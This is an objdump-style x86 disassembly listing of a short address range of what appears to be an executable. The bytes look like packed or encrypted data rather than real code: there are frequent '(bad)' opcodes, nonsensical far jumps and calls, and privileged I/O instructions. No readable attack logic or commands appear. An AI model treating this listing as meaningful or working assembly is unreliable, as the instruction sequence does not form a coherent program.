  4218a6:	cmp    BYTE PTR [ebx],dl
  4218a8:	(bad)  
  4218aa:	out    0x68,eax
  4218ac:	arpl   WORD PTR [ebx-0x1c],di
  4218af:	pop    ss
  4218b0:	push   es
  4218b1:	push   eax
  4218b2:	pop    edi
  4218b3:	jecxz  0x421886
  4218b5:	pop    ebp
  4218b6:	add    BYTE PTR [edx-0x5e44954f],bh
  4218bc:	inc    edi
  4218bd:	xchg   ebp,eax
  4218be:	mov    edi,0x767a8b67
  4218c3:	add    BYTE PTR [ebx],dl
  4218c5:	aaa    
  4218c6:	loop   0x4218d7
  4218c8:	xchg   ecx,eax
  4218c9:	sub    al,0xb
  4218cb:	jle    0x42187b
  4218cd:	cld    
  4218ce:	xchg   esp,eax
  4218cf:	ucomiss xmm7,DWORD PTR [esi]
  4218d2:	xchg   BYTE PTR [eax-0x46],ah
  4218d5:	or     al,0xe1
  4218d7:	out    dx,al
  4218d8:	ret    0x67e1
  4218db:	stos   BYTE PTR es:[edi],al
  4218dc:	in     eax,0x7d
  4218de:	sbb    DWORD PTR [ecx-0x73cd7998],edx
  4218e4:	push   0x945bf31b
  4218e9:	xchg   ebp,eax
  4218ea:	ficom  WORD PTR [ebx]
  4218ec:	inc    ebx
  4218ed:	loopne 0x4218be
  4218ef:	xchg   esi,eax
  4218f0:	imul   edx,DWORD PTR ss:[esi-0x2a676fdb],0xbd569d8
  4218fb:	pushf  
  4218fc:	mov    esp,0x16ad66c5
  421901:	cmp    DWORD PTR [eax+0x5d4a4f10],ebp
  421907:	ds mov esi,0x20facf66
  42190d:	das    
  42190e:	leave  
  42190f:	mov    ch,0xe0
  421911:	mov    gs,esi
  421913:	call   0xde2a:0xbbf7be06
  42191a:	sub    DWORD PTR [ebp-0x4f],edi
  42191d:	xchg   ebx,eax
  42191e:	call   0xc8bdcd94
  421923:	mov    edx,0x51abe593
  421928:	dec    edx
  421929:	popf   
  42192a:	jmp    0xf83617ee
  42192f:	adc    eax,0x4b4a29ff
  421934:	sub    DWORD PTR [edi],0x8302907e
  42193a:	inc    ebx
  42193b:	gs jmp 0x73b4:0xd7cceac3
  421943:	dec    esp
  421944:	xchg   esi,eax
  421945:	pusha  
  421946:	xor    cl,bh
  421948:	push   ebx
  421949:	arpl   WORD PTR [esi-0x35],si
  42194c:	xor    al,0x4b
  42194e:	aaa    
  42194f:	movzx  edi,BYTE PTR [ecx+0x41]
  421953:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421954:	sbb    DWORD PTR [edi],edi
  421956:	pop    esp
  421957:	lods   eax,DWORD PTR ds:[esi]
  421958:	fimul  DWORD PTR [ebp+0x797aed32]
  42195e:	jmp    0x421986
  421960:	fild   WORD PTR [ecx]
  421962:	fsub   st(6),st
  421964:	iret   
  421965:	inc    esp
  421966:	xchg   edi,eax
  421967:	retf   
  421968:	ss pop es
  42196a:	sub    edi,edi
  42196c:	dec    edi
  42196d:	loopne 0x42193a
  42196f:	add    dh,BYTE PTR [edx-0x2d0a4956]
  421975:	in     al,dx
  421976:	pop    ebx
  421977:	jmp    0x421953
  421979:	jmp    0x4219a8
  42197b:	add    BYTE PTR [edx-0x58],cl
  42197e:	in     eax,dx
  42197f:	test   BYTE PTR [esi+ebx*2-0x4],0x83
  421984:	outs   dx,DWORD PTR ds:[esi]
  421985:	ret    
  421986:	mov    al,ds:0xa69e7133
  42198b:	mov    bl,0x47
  42198d:	xchg   edi,eax
  42198e:	out    dx,al
  42198f:	dec    edx
  421990:	cs shr eax,1
  421993:	xor    eax,0x404a1409
  421998:	jmp    FWORD PTR [esi-0x163d0650]
  42199e:	xor    al,0xc1
  4219a0:	adc    DWORD PTR [edi],esi
  4219a2:	mov    ds:0x7613fe14,al
  4219a7:	push   edi
  4219a8:	inc    edx
  4219a9:	sar    DWORD PTR fs:[edx+0x23],0xfd
  4219ae:	cld    
  4219af:	iret   
  4219b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219b1:	jp     0x4219d5
  4219b3:	xor    edx,DWORD PTR [esi+0x44]
  4219b6:	outs   dx,BYTE PTR ds:[esi]
  4219b7:	pop    esp
  4219b8:	addr16 push 0x22
  4219bb:	jne    0x421a06
  4219bd:	xor    DWORD PTR [ebp+0xf],edx
  4219c0:	dec    BYTE PTR [edx-0x3f87bbab]
  4219c6:	in     eax,0xd2
  4219c8:	mov    cs,eax
  4219ca:	mov    dl,0xa
  4219cc:	scas   al,BYTE PTR es:[edi]
  4219cd:	aaa    
  4219ce:	sbb    BYTE PTR [ebp+0x112df21b],cl
  4219d4:	jg     0x421997
  4219d6:	pop    eax
  4219d7:	cmp    BYTE PTR [ecx-0x27b586c3],dh
  4219dd:	out    dx,al
  4219de:	scas   eax,DWORD PTR es:[edi]
  4219df:	ins    DWORD PTR es:[edi],dx
  4219e0:	out    0x4d,al
  4219e2:	jg     0x421a16
  4219e4:	enter  0x7c44,0x29
  4219e8:	add    eax,0xb7199349
  4219ed:	test   DWORD PTR [ebx+0x6a],edx
  4219f0:	pop    edi
  4219f1:	std    
  4219f2:	inc    eax
  4219f3:	pop    ecx
  4219f4:	dec    esi
  4219f5:	add    DWORD PTR [eax+0x33cbb3f4],eax
  4219fb:	mov    eax,ds:0x7d1cb490
  421a00:	jl     0x421a39
  421a02:	lock push ds
  421a04:	or     al,0x6e
  421a06:	inc    ebp
  421a07:	add    bl,ch
  421a09:	mov    al,0x75
  421a0b:	or     BYTE PTR [eax],ch
  421a0d:	std    
  421a0e:	cli    
  421a0f:	imul   ebx,DWORD PTR [edi+0x6eeaed72],0x811b9461
  421a19:	arpl   si,bp
  421a1b:	out    0xc,eax
  421a1d:	test   ch,dh
  421a1f:	pop    eax
  421a20:	pop    esi
  421a21:	inc    ebx
  421a22:	pop    ebp
  421a23:	jnp    0x421a28
  421a25:	xchg   ebp,eax
  421a26:	pushf  
  421a27:	fstp   DWORD PTR [ecx+0x52]
  421a2a:	push   es
  421a2b:	mov    ebx,0x5784bbe9
  421a30:	inc    ebx
  421a31:	ins    BYTE PTR es:[edi],dx
  421a32:	and    eax,0xc6102aec
  421a37:	sbb    al,0xe3
  421a39:	cmp    DWORD PTR [ebp-0x17c73efb],0xe6c7e6cd
  421a43:	call   0x28c4:0x8a216dc1
  421a4a:	(bad)  
  421a4b:	mov    ds:0x1deda130,al
  421a50:	enter  0x11cc,0xda
  421a54:	scas   eax,DWORD PTR es:[edi]
  421a55:	cdq    
  421a56:	mov    esp,0xf8231ea4
  421a5b:	fcmovnu st,st(0)
  421a5d:	ins    BYTE PTR es:[edi],dx
  421a5e:	into   
  421a5f:	enter  0x9835,0xf
  421a63:	xor    BYTE PTR [ebp+0x7d],dl
  421a66:	hlt    
  421a67:	mov    dh,0x1d
  421a69:	gs inc ecx
  421a6b:	cmp    eax,0x8d1e9801
  421a70:	mov    bh,0xc3
  421a72:	outs   dx,DWORD PTR ds:[esi]
  421a73:	mov    ?,ebp
  421a75:	outs   dx,DWORD PTR ds:[esi]
  421a76:	xchg   edx,eax
  421a77:	retf   
  421a78:	mov    dh,0xd8
  421a7a:	push   0x53
  421a7c:	cld    
  421a7d:	lock mov dl,0xc1
  421a80:	rcr    BYTE PTR [ecx],cl
  421a82:	sbb    al,0x83
  421a84:	ret    0xa766
  421a87:	jecxz  0x421a57
  421a89:	add    eax,0x190d8204
  421a8e:	and    edx,edi
  421a90:	xlat   BYTE PTR ds:[ebx]
  421a91:	and    al,bh
  421a93:	mov    ds:0x958185fa,al
  421a98:	aam    0x65
  421a9a:	call   0x2ab3e750
  421a9f:	mov    edi,0xc36860cd
  421aa4:	arpl   di,di
  421aa6:	fiadd  DWORD PTR [edx]
  421aa8:	push   ebx
  421aa9:	popf   
  421aaa:	int    0x25
  421aac:	jo     0x421a96
  421aae:	das    
  421aaf:	xchg   esi,eax
  421ab0:	push   eax
  421ab1:	sahf   
  421ab2:	pop    esp
  421ab3:	and    BYTE PTR [eax],ah
  421ab5:	dec    edx
  421ab6:	and    ebp,ecx
  421ab8:	mov    ds:0x62090296,eax
  421abd:	or     eax,0x44fc37ce
  421ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ac3:	cli    
  421ac4:	and    BYTE PTR [ebp+edi*1+0x1f],ah
  421ac8:	dec    esp
  421ac9:	sbb    BYTE PTR [ecx],0xa4
  421acc:	mov    WORD PTR [ecx],es
  421ace:	inc    ecx
  421acf:	enter  0xe22d,0x16
  421ad3:	and    eax,ecx
  421ad5:	gs jg  0x421a73
  421ad8:	dec    ebx
  421ad9:	stos   BYTE PTR es:[edi],al
  421ada:	xchg   edx,eax
  421adb:	leave  
  421adc:	push   edx
  421add:	sub    ah,BYTE PTR [edi+0x5a3e45b3]
  421ae3:	sbb    DWORD PTR [edi+ebx*1+0x1d54ef51],0xffffff9f
  421aeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421aec:	shr    BYTE PTR [esp+eax*1-0x48],1
  421af0:	f2xm1  
  421af2:	mov    ds:0x701bd896,al
  421af7:	sti    
  421af8:	pop    ss
  421af9:	push   edx
  421afa:	cli    
  421afb:	push   es
  421afc:	xchg   edi,eax
  421afd:	mov    ebp,0x71eb6092
  421b02:	lock js 0x421ae5
  421b05:	mov    ah,0xb3
  421b07:	mov    cl,0x6c
  421b09:	iret   
  421b0a:	(bad)  
  421b0b:	leave  
  421b0c:	jnp    0xc5c2428f
  421b12:	nop
  421b13:	out    dx,al
  421b14:	sub    DWORD PTR [eax-0xc],ebx
  421b17:	add    edx,DWORD PTR [esi+edi*4]
  421b1a:	dec    ecx
  421b1b:	add    ch,BYTE PTR [ecx-0x71]
  421b1e:	retf   0x4f0
  421b21:	(bad)  
  421b22:	sbb    al,0xef
  421b24:	xchg   esi,eax
  421b25:	cdq    
  421b26:	in     eax,0x46
  421b28:	in     al,dx
  421b29:	sub    al,0x3b
  421b2b:	dec    ebp
  421b2c:	inc    ebx
  421b2d:	jns    0x421b5d
  421b2f:	mov    al,0x54
  421b31:	xchg   esp,eax
  421b32:	adc    ah,bl
  421b34:	imul   eax,esp,0x17
  421b37:	loopne 0x421b34
  421b39:	inc    ebp
  421b3a:	ret    0xb215
  421b3d:	stc    
  421b3e:	imul   ebx,DWORD PTR [ecx-0x78],0xfffffffc
  421b42:	mov    edi,esp
  421b44:	enter  0x4291,0x35
  421b48:	jne    0x421b2e
  421b4a:	and    ah,BYTE PTR [esi]
  421b4c:	popa   
  421b4d:	loopne 0x421b2b
  421b4f:	inc    ebx
  421b50:	cs (bad) 
  421b52:	xchg   ebx,eax
  421b53:	arpl   sp,dx
  421b55:	not    cl
  421b57:	shl    edi,0xf5
  421b5a:	shl    BYTE PTR ds:0x8494676d,0x7
  421b61:	jo     0x421bcf
  421b63:	or     DWORD PTR [edx-0x763a6216],ebp
  421b69:	xor    al,0x44
  421b6b:	mov    dl,bl
  421b6d:	add    edx,edx
  421b6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b70:	add    al,0x10
  421b72:	or     DWORD PTR [edx+0x30947a17],eax
  421b78:	ins    BYTE PTR es:[edi],dx
  421b79:	lods   al,BYTE PTR ds:[esi]
  421b7a:	push   0x7e
  421b7c:	mov    dl,0x2f
  421b7e:	outs   dx,BYTE PTR ds:[esi]
  421b7f:	fsubr  QWORD PTR [esi-0x1d]
  421b82:	lea    ebp,[edi+0x6c]
  421b85:	arpl   sp,bp
  421b87:	int3   
  421b88:	xor    bl,ch
  421b8a:	pop    ebx
  421b8b:	in     al,dx
  421b8c:	xchg   eax,edx
  421b8e:	fsub   DWORD PTR [edx+0x9ef0d8b]
  421b94:	repnz loope 0x421be6
  421b97:	mov    ch,0x43
  421b99:	xchg   ebp,eax
  421b9a:	lods   eax,DWORD PTR ds:[esi]
  421b9b:	icebp  
  421b9c:	mov    bh,0x74
  421b9e:	sbb    eax,0x29d3d30b
  421ba3:	test   BYTE PTR [ecx-0x7815f8b],bl
  421ba9:	daa    
  421baa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bab:	xchg   ebp,eax
  421bac:	icebp  
  421bad:	inc    edx
  421bae:	scas   eax,DWORD PTR es:[edi]
  421baf:	mov    ds:0x6e5c8786,eax
  421bb4:	jle    0x421b89
  421bb6:	xor    ebp,DWORD PTR [ebp+0x5a]
  421bb9:	and    DWORD PTR [edx-0x296b665d],edx
  421bbf:	cmc    
  421bc0:	pop    esp
  421bc1:	dec    edi
  421bc2:	dec    eax
  421bc3:	ret    0x3442
  421bc6:	pusha  
  421bc7:	mov    ah,0x63
  421bc9:	into   
  421bca:	mov    edi,0xe7d578b3
  421bcf:	in     al,0xa5
  421bd1:	xchg   edx,eax
  421bd2:	scas   al,BYTE PTR es:[edi]
  421bd3:	sbb    DWORD PTR [edx+0x25189aa6],0x9e6e8faf
  421bdd:	mov    bh,0xb6
  421bdf:	enter  0x2de9,0xda
  421be3:	call   0x99aa5362
  421be8:	icebp  
  421be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bea:	or     dh,BYTE PTR [edi]
  421bec:	and    eax,0x92c94959
  421bf1:	adc    bl,BYTE PTR [edi]
  421bf3:	pushf  
  421bf4:	int3   
  421bf5:	retf   0x76b2
  421bf8:	and    al,0x37
  421bfa:	add    al,0x31
  421bfc:	sbb    ah,BYTE PTR [ecx+0x3572af00]
  421c02:	cmc    
  421c03:	fistp  WORD PTR [esi+0x31]
  421c06:	mov    dh,0x61
  421c08:	mov    bh,0x7c
  421c0a:	xor    eax,DWORD PTR [ebx]
  421c0c:	sahf   
  421c0d:	ror    DWORD PTR [ecx+ecx*8+0x17],cl
  421c11:	aad    0xdd
  421c13:	int3   
  421c14:	jp     0x421c38
  421c16:	test   DWORD PTR [edx+0x5e],esp
  421c19:	idiv   DWORD PTR [ebx+0x3f]
  421c1c:	(bad)  
  421c1d:	mov    cs,eax
  421c1f:	push   ds
  421c20:	lea    eax,[ecx+0x16]
  421c23:	int3   
  421c24:	(bad)  
  421c25:	push   esi
  421c26:	retf   
  421c27:	mov    bl,ah
  421c29:	fisubr DWORD PTR [eax+0x26]
  421c2c:	mov    ebx,0x8c04ed20
  421c31:	retf   
  421c32:	jle    0x421c55
  421c34:	loop   0x421c64
  421c36:	rcl    BYTE PTR [esi],1
  421c38:	je     0x421c8f
  421c3a:	mov    dl,0x4f
  421c3c:	cmc    
  421c3d:	pop    eax
  421c3e:	fisub  DWORD PTR ds:0x47d2d8c0
  421c44:	out    dx,al
  421c45:	pop    edx
  421c46:	ja     0x421c1c
  421c48:	aaa    
  421c49:	adc    eax,0x3c45a68d
  421c4e:	retf   
  421c4f:	mov    dl,0xba
  421c51:	rcr    DWORD PTR [ecx+ecx*1-0x53],0xe6
  421c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c57:	pushf  
  421c58:	lods   eax,DWORD PTR ds:[esi]
  421c59:	clc    
  421c5a:	aad    0xe8
  421c5c:	mov    ch,ah
  421c5e:	sbb    bh,BYTE PTR [ebp+0x77]
  421c61:	inc    eax
  421c62:	jmp    0x2e1a:0x4be63f7e
  421c69:	loope  0x421c37
  421c6b:	clc    
  421c6c:	mov    ecx,0x681aa46c
  421c71:	pushf  
  421c72:	xor    eax,0x9c5b3c34
  421c77:	adc    DWORD PTR [edi],edx
  421c79:	jl     0x421c7d
  421c7b:	fist   DWORD PTR [ebp+0x17]
  421c7e:	fst    QWORD PTR [esp+edi*4-0x3023b269]
  421c85:	jmp    0xa652af82
  421c8a:	scas   eax,DWORD PTR es:[edi]
  421c8b:	push   esi
  421c8c:	sbb    DWORD PTR ds:0xa6f23ee,esi
  421c92:	shl    DWORD PTR [ebp+0x3a],cl
  421c95:	and    BYTE PTR ds:[ebp-0x4a],bh
  421c99:	dec    esi
  421c9a:	sbb    DWORD PTR [eax],0xffffff8c
  421c9d:	ins    BYTE PTR es:[edi],dx
  421c9e:	scas   eax,DWORD PTR es:[edi]
  421c9f:	jae    0x421cd7
  421ca1:	(bad)  
  421ca2:	pop    ds
  421ca3:	jmp    0xd973:0xae23800e
  421caa:	add    ah,BYTE PTR ds:0x8c1299a8
  421cb0:	push   edi
  421cb1:	pop    ss
  421cb2:	fidiv  DWORD PTR [esi-0xe19e7a6]
  421cb8:	aaa    
  421cb9:	xor    eax,0x74040282
  421cbe:	jmp    0xfb39:0x97930004
  421cc5:	add    edi,esi
  421cc7:	imul   eax,DWORD PTR [edi+ebx*2+0x5a],0x0
	...
  421ce8:	add    BYTE PTR [eax],al
  421cea:	push   esi
  421ceb:	inc    ebx
  421cec:	pop    edx
  421ced:	pop    ecx
  421cee:	pop    edi
  421cef:	pop    ecx
  421cf0:	push   edi
  421cf1:	dec    edi
  421cf2:	mov    fs,WORD PTR [ecx-0x3c22168e]
  421cf8:	mov    edi,0x1ab0fe0
  421cfd:	add    BYTE PTR [ecx+0x52000006],cl
  421d03:	sbb    dh,al
  421d05:	shr    BYTE PTR [esp+esi*4-0x2],0x97
  421d0a:	fisttp QWORD PTR [edx-0x3bab757]
  421d10:	repnz stc 
  421d12:	push   eax
  421d13:	push   ss
  421d14:	push   ebx
  421d15:	retf   0xab1
  421d18:	lods   eax,DWORD PTR ds:[esi]
  421d19:	adc    eax,0x2a692f56
  421d1e:	mov    edi,0x413c2666
  421d23:	jno    0x421cbb
  421d25:	add    ah,BYTE PTR [edx+0x21]
  421d28:	into   
  421d29:	jns    0x421da6
  421d2b:	xchg   esp,eax
  421d2c:	xor    al,BYTE PTR [edx-0x79]
  421d2f:	out    0xdb,eax
  421d31:	in     al,0x13
  421d33:	addr16 jl 0x421da9
  421d36:	mov    edi,0x96b6c5e5
  421d3b:	add    eax,0x13d0c43
  421d40:	mov    edx,0xbf8effc7
  421d45:	xchg   ebp,eax
  421d46:	adc    eax,0x2943f995
  421d4b:	pop    esi
  421d4c:	(bad)  
  421d4e:	mov    ds:0x52bdfbeb,eax
  421d53:	stc    
  421d54:	add    ecx,esp
  421d56:	jge    0x421d81
  421d58:	adc    ebp,esi
  421d5a:	push   edx
  421d5b:	cdq    
  421d5c:	iret   
  421d5d:	jle    0x421d36
  421d5f:	sar    DWORD PTR [edx-0x5e],0xc6
  421d63:	push   esi
  421d64:	xlat   BYTE PTR ds:[ebx]
  421d65:	and    eax,0xe08a6af9
  421d6a:	jmp    0x421db5
  421d6c:	pushf  
  421d6d:	jg     0x421da9
  421d6f:	cwde   
  421d70:	out    dx,eax
  421d71:	pop    ecx
  421d72:	sub    BYTE PTR [esi],ch
  421d74:	or     esi,DWORD PTR [ecx+esi*4+0x427a0a7]
  421d7b:	aas    
  421d7c:	shl    al,1
  421d7e:	jmp    0xe18ab511
  421d83:	xlat   BYTE PTR ds:[ebx]
  421d84:	stos   BYTE PTR es:[edi],al
  421d85:	mul    edi
  421d87:	test   eax,0xa0b18a89
  421d8c:	push   ebx
  421d8d:	shr    DWORD PTR [edi],cl
  421d8f:	aam    0xf9
  421d91:	ficom  WORD PTR [ecx]
  421d93:	cli    
  421d94:	and    al,0x31
  421d96:	add    esi,DWORD PTR [esi+esi*2+0x36]
  421d9a:	pop    ebx
  421d9b:	leave  
  421d9c:	icebp  
  421d9d:	sub    BYTE PTR [edx+0x343d9995],dl
  421da3:	lods   eax,DWORD PTR ds:[esi]
  421da4:	jecxz  0x421dce
  421da6:	ret    0xdb7a
  421da9:	mov    ds:0xb3a99ede,eax
  421dae:	lock aas 
  421db0:	call   0x3089:0x5501f62e
  421db7:	jl     0x421e32
  421db9:	adc    BYTE PTR ds:0xc160e2ea,bl
  421dbf:	ds nop
  421dc1:	xchg   esi,eax
  421dc2:	gs aam 0x48
  421dc5:	cmp    DWORD PTR ds:0x1bddc96a,ebx
  421dcb:	ret    0xd6fe
  421dce:	pop    ecx
  421dcf:	cmc    
  421dd0:	fiadd  WORD PTR [edx+0x1a]
  421dd3:	mov    esp,0x4aab6b5b
  421dd8:	clc    
  421dd9:	adc    dl,BYTE PTR [ecx]
  421ddb:	popf   
  421ddc:	push   es
  421ddd:	adc    BYTE PTR [eax+0x76],ch
  421de0:	and    eax,DWORD PTR [ebp+0x24cb7abd]
  421de6:	sub    dh,BYTE PTR [edx+0x29]
  421de9:	push   ebx
  421dea:	lds    edi,FWORD PTR [esi]
  421dec:	cs loopne 0x421d9f
  421def:	in     eax,0x36
  421df1:	stos   BYTE PTR es:[edi],al
  421df2:	adc    edi,DWORD PTR [ebp+0x4e56803d]
  421df8:	push   cs
  421df9:	retf   0xd5e2
  421dfc:	sti    
  421dfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dfe:	nop
  421dff:	xlat   BYTE PTR ds:[ebx]
  421e00:	and    ebp,edx
  421e02:	repz jbe 0x421df0
  421e05:	xchg   esp,eax
  421e06:	dec    edi
  421e07:	test   eax,0xad572563
  421e0c:	jecxz  0x421e0d
  421e0e:	popf   
  421e0f:	mul    esi
  421e11:	add    esi,edi
  421e13:	mov    esi,0x637269d1
  421e18:	sub    ah,bh
  421e1a:	in     al,0xfa
  421e1c:	inc    ebx
  421e1d:	loope  0x421e11
  421e1f:	mov    eax,0x8eebeec9
  421e24:	mov    cs,WORD PTR [ebx]
  421e26:	call   0xfbea25a6
  421e2b:	fcomi  st,st(7)
  421e2d:	add    BYTE PTR [eax+0x1a36bfeb],cl
  421e33:	arpl   WORD PTR [ebx+eax*4],di
  421e36:	push   ebx
  421e37:	ret    0x9586
  421e3a:	das    
  421e3b:	inc    ebx
  421e3c:	in     eax,dx
  421e3d:	(bad)  
  421e3e:	cdq    
  421e3f:	sahf   
  421e40:	dec    ecx
  421e41:	ins    BYTE PTR es:[edi],dx
  421e42:	and    BYTE PTR [esp+eiz*2-0x2a0b0b32],cl
  421e49:	and    eax,0xb9f9b9d0
  421e4e:	or     bl,BYTE PTR [eax+0x5619345a]
  421e54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e55:	cwde   
  421e56:	mov    ebx,0xbd6cb6bf
  421e5b:	mov    edi,0xa14d83df
  421e60:	jl     0x421ea6
  421e62:	sub    eax,0xf8f4f03e
  421e67:	aas    
  421e68:	pusha  
  421e69:	out    dx,al
  421e6a:	adc    DWORD PTR [ebp-0x1d],edx
  421e6d:	imul   ebp,DWORD PTR [esi-0x2275575d],0x73
  421e74:	cwde   
  421e75:	xor    BYTE PTR [edx],al
  421e77:	mov    cs,ebp
  421e79:	mov    WORD PTR [edx+0x78c81f60],ds
  421e7f:	fiadd  WORD PTR [edx+0x3636c178]
  421e85:	jo     0x421e78
  421e87:	div    dl
  421e89:	jecxz  0x421e94
  421e8b:	pmaxsw mm7,QWORD PTR [ebx]
  421e8e:	ror    DWORD PTR [edi],1
  421e90:	inc    ecx
  421e91:	out    0x67,al
  421e93:	daa    
  421e94:	xor    DWORD PTR [ecx+0x1008d665],eax
  421e9a:	jns    0x421eff
  421e9c:	jns    0x421e5b
  421e9e:	out    0x14,al
  421ea0:	cmp    bh,BYTE PTR [ecx+0x3c99ef7]
  421ea6:	shr    BYTE PTR [edx-0x2010354a],0x49
  421ead:	dec    ecx
  421eae:	dec    esi
  421eaf:	js     0x421ec7
  421eb1:	sti    
  421eb2:	and    BYTE PTR [ecx+esi*4-0x5d],ch
  421eb6:	mov    ?,WORD PTR [eax-0x77]
  421eb9:	js     0x421ee4
  421ebb:	outs   dx,DWORD PTR ds:[esi]
  421ebc:	repz dec ebp
  421ebe:	sti    
  421ebf:	(bad)  
  421ec0:	js     0x421e72
  421ec2:	dec    ebp
  421ec3:	(bad)  
  421ec4:	fcom   QWORD PTR [eax-0x4b1e4124]
  421eca:	into   
  421ecb:	outs   dx,DWORD PTR ds:[esi]
  421ecc:	xchg   ebx,eax
  421ecd:	(bad)  
  421ece:	dec    ebx
  421ecf:	bound  ebx,QWORD PTR [edi+0x1b]
  421ed2:	mov    al,ds:0x3f36f400
  421ed7:	retf   
  421ed8:	push   cs
  421ed9:	jmp    0xf662:0x91d57bf0
  421ee0:	push   eax
  421ee2:	ficomp WORD PTR [edx+0x130a2859]
  421ee8:	push   ebp
  421ee9:	psubusw mm6,QWORD PTR [esi-0x917be8f]
  421ef0:	mov    cl,0x10
  421ef2:	cmp    eax,0xfdf6bfbe
  421ef7:	inc    ebp
  421ef8:	or     DWORD PTR [esi+0x4eb11b6],ebp
  421efe:	popf   
  421eff:	loopne 0x421f77
  421f01:	outs   dx,BYTE PTR ds:[esi]
  421f02:	jo     0x421eba
  421f04:	sub    esp,edi
  421f06:	cmp    ecx,DWORD PTR [ebx]
  421f08:	xor    al,0x46
  421f0a:	rcl    BYTE PTR [edi-0x151d67d9],0xcc
  421f11:	jb     0x421f6c
  421f13:	xchg   bh,al
  421f15:	jecxz  0x421f6c
  421f17:	push   0xd9c56d8f
  421f1c:	jne    0x421f5e
  421f1e:	xor    eax,0xa698b504
  421f23:	sub    al,0xd
  421f25:	rcr    DWORD PTR [ebp-0x2],1
  421f28:	and    ah,dh
  421f2a:	and    DWORD PTR [esi],esp
  421f2c:	and    edx,esp
  421f2e:	or     DWORD PTR [eax-0x23],eax
  421f31:	xchg   esp,eax
  421f32:	mov    esp,fs
  421f34:	sti    
  421f35:	pop    ecx
  421f36:	sbb    DWORD PTR [ebx-0x9],esi
  421f39:	or     ebp,DWORD PTR [esi+0x331f7a92]
  421f3f:	test   DWORD PTR [eax+0x50a92fea],esi
  421f45:	inc    edx
  421f46:	xchg   edx,eax
  421f47:	es dec eax
  421f49:	xchg   ecx,eax
  421f4a:	scas   al,BYTE PTR es:[edi]
  421f4b:	ins    DWORD PTR es:[edi],dx
  421f4c:	stos   DWORD PTR es:[edi],eax
  421f4d:	xor    DWORD PTR [edx],edx
  421f4f:	dec    edi
  421f50:	pop    ss
  421f51:	adc    DWORD PTR [esi-0x2d],esp
  421f54:	jle    0x421f31
  421f56:	repz dec ebp
  421f58:	xchg   ebp,eax
  421f59:	xlat   BYTE PTR ds:[ebx]
  421f5a:	retf   
  421f5b:	test   al,0xf9
  421f5d:	pop    ecx
  421f5e:	or     BYTE PTR [ebx-0x548faeb],cl
  421f64:	pop    es
  421f65:	push   ebp
  421f66:	stos   BYTE PTR es:[edi],al
  421f67:	cmp    BYTE PTR [edx-0x36],ch
  421f6a:	pusha  
  421f6b:	and    eax,0xbb0cd11f
  421f70:	and    ch,cl
  421f72:	mov    al,ds:0xbe4158ff
  421f77:	jno    0x421f39
  421f79:	dec    DWORD PTR [ebp-0x59]
  421f7c:	rol    DWORD PTR [edx-0xd],cl
  421f7f:	sub    DWORD PTR [eax+ecx*2-0x6a],ecx
  421f83:	aam    0x74
  421f85:	add    al,0x17
  421f87:	mov    dl,0xb1
  421f89:	mov    edi,0x9a6a1123
  421f8e:	call   0x4415:0xd80f767e
  421f95:	ins    BYTE PTR es:[edi],dx
  421f96:	fs nop
  421f98:	mov    esi,0x811cdd4f
  421f9d:	and    ah,BYTE PTR [ecx]
  421f9f:	scas   eax,DWORD PTR es:[edi]
  421fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fa1:	inc    ebx
  421fa2:	ficomp WORD PTR [edi]
  421fa4:	mov    cl,ch
  421fa6:	loopne 0x422008
  421fa8:	ret    
  421fa9:	adc    dl,dl
  421fab:	mov    bl,BYTE PTR ds:0x213cd61d
  421fb1:	mov    ecx,0xc0e7ce74
  421fb6:	xlat   BYTE PTR ds:[ebx]
  421fb7:	call   0x1015:0x309e58b3
  421fbe:	inc    edi
  421fbf:	test   eax,0x81b049f8
  421fc4:	not    ebx
  421fc6:	lea    eax,[eax+0x54]
  421fc9:	xchg   esp,eax
  421fca:	arpl   WORD PTR [ebp-0x2007d542],ax
  421fd0:	and    BYTE PTR [ebx-0x44],dh
  421fd3:	add    eax,edx
  421fd5:	and    DWORD PTR [ecx-0x50],ecx
  421fd8:	std    
  421fd9:	push   eax
  421fda:	rcl    BYTE PTR [ebx-0x6b],0xbf
  421fde:	loop   0x421f77
  421fe0:	fs inc esp
  421fe2:	mov    dh,0x60
  421fe4:	mov    edi,0x49658e6e
  421fe9:	adc    eax,0x178bf1c2
  421fee:	or     eax,0xe6675f4d
  421ff3:	add    ebx,DWORD PTR [ebx+0x1eb4cd39]
  421ff9:	mov    ss,WORD PTR [edi-0x7ef1532d]
  421fff:	jle    0x421ff2
  422001:	dec    edi
  422002:	iret   
  422003:	push   edi
  422004:	add    BYTE PTR [ebx],0x6d
  422007:	stos   DWORD PTR es:[edi],eax
  422008:	add    ah,dl
  42200a:	je     0x42203c
  42200c:	mov    cl,BYTE PTR ds:0xca105a09
  422012:	ret    0x8ab7
  422015:	dec    edi
  422016:	jns    0x42207c
  422018:	popf   
  422019:	retf   0x293d
  42201c:	mov    dh,0x8a
  42201e:	jb     0x421fa1
  422020:	daa    
  422021:	(bad)  
  422022:	mov    ecx,0xed815d40
  422027:	jbe    0x421ff3
  422029:	fadd   QWORD PTR [esp+esi*4-0x7e]
  42202d:	hlt    
  42202e:	bound  ebx,QWORD PTR [edi+eax*1-0x5f]
  422032:	and    edi,edx
  422034:	loop   0x42206a
  422036:	mov    cl,0xf0
  422038:	popa   
  422039:	stc    
  42203a:	inc    esp
  42203b:	fwait
  42203c:	retf   
  42203d:	inc    edi
  42203e:	call   0x2f6:0x4d4f1079
  422045:	lahf   
  422046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422047:	inc    eax
  422048:	jb     0x42208d
  42204a:	cmp    al,0x87
  42204c:	cmc    
  42204d:	or     ecx,esi
  42204f:	sbb    DWORD PTR [edx],ecx
  422051:	xor    BYTE PTR ds:0xe29fba43,ch
  422057:	test   DWORD PTR [ecx-0x2f],0x1a82221d
  42205e:	jb     0x422050
  422060:	mov    dh,BYTE PTR [esi]
